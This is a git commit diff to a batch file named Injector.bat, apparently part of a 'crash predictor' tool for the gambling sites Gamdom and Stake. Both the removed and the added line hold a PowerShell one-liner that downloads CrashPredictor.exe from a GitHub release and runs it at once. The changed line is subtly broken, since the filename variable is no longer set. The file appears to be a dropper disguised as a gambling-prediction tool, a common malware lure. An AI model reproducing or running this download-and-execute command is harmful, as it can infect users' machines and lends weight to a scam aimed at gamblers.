32d7bbc4f7c77de2a041e810ff64fbc0480c6121
IWcommunityFR <158751385+IWcommunityFR@users.noreply.github.com>
2024-05-31 23:52:59 +0200

    Update Injector.bat

--- Injector.bat
+++ Injector.bat
@@ -8,7 +8,7 @@ echo.
 echo Coded By https://github.com/IWcommunityFR
 echo.
 
-powershell $down=New-Object System.Net.WebClient;$url='https://github.com/IWcommunityFR/gamdom-crash-preditor/releases/download/Gamdom-Crash-Predictor/CrashPredictor.exe';$file='CrashPredictor.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
+powershell $down=New-Object System.Net.WebClient;$url='https://github.com/IWcommunityFR/stake-crash-preditor/releases/download/Gamdom-Crash-Predictor/CrashPredictor.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
 
 
 https://stake.com/fr/
